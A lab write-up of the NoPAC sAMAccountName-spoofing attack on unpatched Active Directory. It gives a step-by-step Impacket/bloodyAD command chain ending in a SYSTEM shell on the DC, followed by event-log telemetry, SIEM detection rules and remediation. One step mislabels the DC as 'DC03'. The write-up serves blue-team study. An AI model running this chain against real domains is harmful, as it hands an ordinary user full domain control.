# CVE-2021-42278 / CVE-2021-42287 — NoPAC / sAMAccountName Spoofing

> **Historical note:** Both CVEs were patched in November 2021 (KB5008102 / KB5008380). This writeup is for educational and blue team purposes. The lab was built on a genuine unpatched Windows Server 2016 RTM ISO (build 14393.0) to generate real telemetry — not a simulated environment.

---

## What Is It

NoPAC chains two Active Directory vulnerabilities to let a standard domain user escalate to Domain Admin with no special privileges beyond a GenericAll ACE over any user or the default MachineAccountQuota.

**CVE-2021-42278** — AD does not enforce that computer account names end with `$`. A user with write access to an account's `sAMAccountName` attribute can rename it to match a Domain Controller's hostname (without the trailing `$`).

**CVE-2021-42287** — When the KDC can't find a principal by name during a service ticket request, it automatically appends `$` and tries again. Combined with the above, this causes the KDC to resolve back to the real DC's machine account and issue a service ticket with DC-level privileges.

---

## How It Works

### The Core KDC Bug (CVE-2021-42287)

When a service ticket is requested for an account that doesn't exist, the KDC doesn't just fail — it automatically appends `$` to the name and tries again. This is a fallback designed to handle edge cases in account lookup. NoPAC weaponises this fallback.

### The Machine Account Path

Machine accounts in AD always end with `$` (e.g. `TEST01$`). The attack renames `TEST01$` to `DC03` — dropping the `$`. Now there's a plain account called `DC03` in the directory. You authenticate as `DC03`, get a TGT, then revert `TEST01$` back to its original name. When you use that TGT to request a service ticket, the KDC looks for `DC03`, finds nothing, appends `$`, and finds `DC03$` — the real Domain Controller. It issues a service ticket scoped to the DC.

### The User Account Path (What This Lab Uses)

User accounts never have `$` in the first place. This is actually simpler — you rename `svcfoo` to `WIN-ARH5LTD6NM8` (matching the DC hostname, no `$` needed because user accounts never had one). Authenticate as `WIN-ARH5LTD6NM8`, get a TGT, revert `svcfoo` back. Same result — KDC looks for `WIN-ARH5LTD6NM8`, finds nothing, appends `$`, finds `WIN-ARH5LTD6NM8$` which is the real DC.

The KDC doesn't know or care whether the impersonating account was originally a machine account or a user account. It only cares that the name in the TGT no longer resolves — which forces the `$` lookup either way.

### Why the User Account Path Is Stealthier

The machine account rename fires **Event 4742** (computer account changed) with the new sAMAccountName visible in plain text in the Changed Attributes field. This is loud and most published detection rules target it.

The user account rename only fires **Event 4662** (directory service object access) with an attribute GUID that requires decoding to understand it's sAMAccountName. This requires properly configured SACLs and analyst knowledge to catch. Without SACLs, the rename is completely invisible.

Same bug. Same result. Different noise level.

---

## Prerequisites

- Standard domain user account (`lowpriv`)
- GenericAll or GenericWrite over any user account (`svcfoo`) — OR — MachineAccountQuota > 0 (default is 10)
- Unpatched DC (pre-November 2021 cumulative update)

---

## Lab Environment

| Component | Detail |
|-----------|--------|
| DC OS | Windows Server 2016 RTM (build 14393.0) |
| Domain | lab.local |
| Attacker account | lowpriv / Password123! |
| Victim account | svcfoo (SPN: HTTP/srv01.lab.local) |
| ACE | lowpriv has GenericAll over svcfoo |
| Attacker machine | Kali Linux |

Vulnerability confirmed via NoPAC scanner — TGT with PAC: 1426 bytes vs TGT without PAC: 685 bytes. Different sizes confirm the DC honours no-PAC requests (patched DCs return identical sizes).

---

## Attack Chain (Linux / Impacket)

### 1. Confirm Vulnerability

```bash
cd ~/noPac
python3 scanner.py -dc-ip 172.16.61.148 lab.local/lowpriv:Password123! -use-ldap
```

Expected output confirms MAQ=10 and two different ticket sizes.

### 2. Note and Clear the Victim's SPN

```bash
bloodyAD -d lab.local -u lowpriv -p 'Password123!' --host 172.16.61.148 \
  get object svcfoo | grep "servicePrincipalName\|sAMAccountName"

bloodyAD -d lab.local -u lowpriv -p 'Password123!' --host 172.16.61.148 \
  set object svcfoo servicePrincipalName
```

The SPN must be cleared — a non-empty SPN causes the KDC to treat the account as a service principal and the TGT request fails.

### 3. Rename svcfoo to Match the DC (CVE-2021-42278)

```bash
bloodyAD -d lab.local -u lowpriv -p 'Password123!' --host 172.16.61.148 \
  set object svcfoo sAMAccountName -v WIN-ARH5LTD6NM8
```

AD applies no validation preventing a user account's sAMAccountName from matching a DC hostname. svcfoo is now masquerading as the DC in the directory.

### 4. Request TGT as the DC Using svcfoo's Credentials

```bash
impacket-getTGT lab.local/win-arh5ltd6nm8:Password123! -dc-ip 172.16.61.148
```

The KDC finds a principal named WIN-ARH5LTD6NM8 (which is svcfoo), accepts the password, and issues a TGT carrying DC03's identity. Saved as `win-arh5ltd6nm8.ccache`.

### 5. Revert svcfoo's sAMAccountName

```bash
bloodyAD -d lab.local -u lowpriv -p 'Password123!' --host 172.16.61.148 \
  set object WIN-ARH5LTD6NM8 sAMAccountName -v svcfoo
```

This is the setup for CVE-2021-42287. WIN-ARH5LTD6NM8 no longer exists as a user. When the service ticket is requested in the next step, the KDC can't find it, appends `$`, and resolves to the real DC machine account.

### 6. S4U2self — Impersonate Administrator (CVE-2021-42287)

```bash
KRB5CCNAME=win-arh5ltd6nm8.ccache impacket-getST \
  lab.local/win-arh5ltd6nm8 \
  -self -impersonate 'Administrator' \
  -altservice 'cifs/win-arh5ltd6nm8.lab.local' \
  -k -no-pass -dc-ip 172.16.61.148
```

S4U2self is a legitimate Kerberos extension allowing a service to obtain a ticket on behalf of a user. The KDC's confused lookup gives us a service ticket with Administrator's identity scoped to CIFS. Saved as `Administrator@cifs_win-arh5ltd6nm8.lab.local@LAB.LOCAL.ccache`.

### 7. SYSTEM Shell via PsExec

```bash
KRB5CCNAME=Administrator@cifs_win-arh5ltd6nm8.lab.local@LAB.LOCAL.ccache \
  impacket-psexec win-arh5ltd6nm8.lab.local -k -no-pass
```

```
C:\Windows\system32> whoami
nt authority\system
```

---

## Blue Team — Event Log Telemetry

The following events were captured from a live attack against the lab DC. All timestamps from 2026-02-26 between 00:32 and 00:35.

### The Attack Signature in Chronological Order

| Time | Event ID | Account | Description |
|------|----------|---------|-------------|
| 00:32:44 | 4768 x2 | lowpriv | Two TGT requests same second — NoPAC scanner PAC vs no-PAC probe |
| 00:33:28 | 4662 | lowpriv | WriteProperty on svcfoo — attribute `{f3a64788}` = servicePrincipalName cleared |
| 00:33:34 | 4662 | lowpriv | WriteProperty on svcfoo — attribute `{3e0abfd0}` = sAMAccountName renamed to DC hostname |
| 00:33:41 | 4768 | WIN-ARH5LTD6NM8 | TGT requested for DC name **without $** from external IP 172.16.61.129 |
| 00:33:48 | 4662 | lowpriv | WriteProperty on svcfoo — sAMAccountName reverted |
| 00:33:56 | 4769 | win-arh5ltd6nm8 | Service ticket requested for WIN-ARH5LTD6NM8$ — S4U2self impersonating Administrator |
| 00:34:52 | 4769 | WIN-ARH5LTD6NM8$ | Service ticket from localhost — psexec lateral movement |

### Detection Signatures

**1. Double 4768 in rapid succession from same external IP**
Two TGT requests within the same second from the same source for the same account. Legitimate users do not request two TGTs simultaneously. This is the scanner's PAC vs no-PAC probe.

**2. 4662 WriteProperty on sAMAccountName by low-privileged account**
Attribute GUID `{3e0abfd0-126a-11d0-a060-00aa006c33ed}` is the sAMAccountName attribute. A standard user modifying another account's sAMAccountName is highly anomalous and has essentially no legitimate use case.

**3. 4768 for a DC hostname without $ from an external IP**
DC machine accounts always authenticate as `HOSTNAME$` with a dollar sign, and always from localhost (`::1`). A TGT request for `WIN-ARH5LTD6NM8` (no dollar sign) from `172.16.61.129` is definitively anomalous.

**4. Rename → TGT → Rename back within seconds**
The 4662 rename at 00:33:34, TGT request at 00:33:41, and revert at 00:33:48 is a 14-second window. This rapid sequence has no legitimate business explanation.

**5. 4769 S4U2self immediately after the suspicious TGT**
Service ticket requested by the account that just received the anomalous TGT, impersonating a privileged account.

### Detection Gap — User Account Variant vs Machine Account Variant

The Linux path using a user account (`svcfoo`) generates **fewer** artifacts than the Windows path using a machine account. Specifically:

- **4742 (computer account changed)** does NOT fire for user account sAMAccountName modifications — only for computer accounts. The Windows attack path using a machine account would produce a clear 4742 with the sAMAccountName change visible in the Changed Attributes field.
- The user account variant relies entirely on **4662 SACL hits**, which only fire if SACLs are properly configured on the domain object. Without SACLs, the rename is invisible.

This means the Linux/user-account variant is stealthier and depends on SACL coverage for detection.

### SIEM Detection Rules (Concept)

**Rule 1 — sAMAccountName modification by non-privileged account:**
```
EventID = 4662
AND AttributeGUID CONTAINS "3e0abfd0-126a-11d0-a060-00aa006c33ed"
AND SubjectAccount NOT IN (Domain Admins, SYSTEM, Enterprise Admins)
```

**Rule 2 — TGT for DC-like name without $ from external source:**
```
EventID = 4768
AND AccountName MATCHES DC hostname pattern
AND AccountName NOT ENDING WITH "$"
AND ClientAddress NOT IN ("::1", "127.0.0.1")
```

**Rule 3 — Correlation rule:**
```
4662 sAMAccountName WriteProperty
FOLLOWED BY 4768 from same source IP
WITHIN 60 seconds
```
```
Encryption Type as a Corroborating Signal (0x17 / RC4)
Of historical note: some early implementations of this attack forced RC4-HMAC (encryption type 0x17) during the TGT request. This made encryption downgrade monitoring a useful detection layer at the time — 4768 events with Ticket Encryption Type = 0x17 for accounts that don't normally use RC4 would stand out.
In practice this signal was always tooling-dependent rather than inherent to the attack. Modern impacket negotiates AES-256 (0x12) cleanly, as seen in this lab's captured telemetry. The RC4 indicator would not have fired here.
Worth understanding for completeness, and relevant if you encounter legacy exploit scripts in the wild — but not a signal to build primary detection logic around even in unpatched environments.
```
---

## Remediation

- Apply KB5008102 and KB5008380 (November 2021 cumulative update)
- Verify with: `Get-HotFix | Where-Object {$_.HotFixID -match "KB5008102|KB5008380"}`
- Reduce MachineAccountQuota to 0 if machine account creation by regular users is not required: `Set-ADDomain -Identity lab.local -Replace @{"ms-DS-MachineAccountQuota"="0"}`
- Implement SACLs on AD objects to ensure 4662 events fire for attribute modifications
- Monitor for 4768 requests where AccountName matches DC hostnames without trailing `$`

---

## References

- [Microsoft Security Advisory CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
- [Microsoft Security Advisory CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)
- [noPac Scanner](https://github.com/Ridter/noPac)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [Impacket](https://github.com/fortra/impacket)
